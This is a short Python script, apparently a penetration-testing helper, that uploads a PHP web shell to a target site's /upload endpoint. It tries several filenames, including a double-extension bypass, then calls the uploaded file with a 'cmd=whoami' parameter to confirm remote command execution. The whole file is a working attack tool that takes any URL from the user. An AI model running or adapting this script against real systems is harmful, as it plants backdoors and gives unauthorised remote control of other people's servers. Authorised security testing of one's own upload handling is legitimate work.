import requests

def test_file_upload(target_url):
    upload_url = f"{target_url.rstrip('/')}/upload"
    shell_filenames = [
        'shell.php',
        'shell.php5',
        'shell.phtml',
        'shell.jpg.php',  # common double extension bypass
    ]

    payload = '<?php echo "SHELL_OK:"; echo shell_exec($_GET["cmd"]); ?>'

    for filename in shell_filenames:
        files = {'file': (filename, payload, 'application/x-php')}
        print(f"\n[+] Trying to upload: {filename}")
        try:
            response = requests.post(upload_url, files=files, timeout=10)
            if response.status_code == 200:
                print(f"    ↳ Upload attempt succeeded (HTTP 200). Check for shell execution.")
            else:
                print(f"    ↳ Upload failed with status: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"    [!] Request failed: {e}")
            continue

        # Attempt to check if the file is accessible
        shell_url = f"{target_url.rstrip('/')}/uploads/{filename}"
        try:
            print(f"    ↳ Checking shell URL: {shell_url}")
            check = requests.get(f"{shell_url}?cmd=whoami", timeout=10)
            if "SHELL_OK:" in check.text:
                output = check.text.split("SHELL_OK:")[1].strip()
                print(f"    ✅ Shell executed! Output: {output}")
            else:
                print(f"    ❌ Shell not executed or blocked.")
        except requests.exceptions.RequestException as e:
            print(f"    [!] Error accessing uploaded shell: {e}")

if __name__ == "__main__":
    target_url = input("Enter the target URL (e.g., http://example.com): ").strip()
    test_file_upload(target_url)
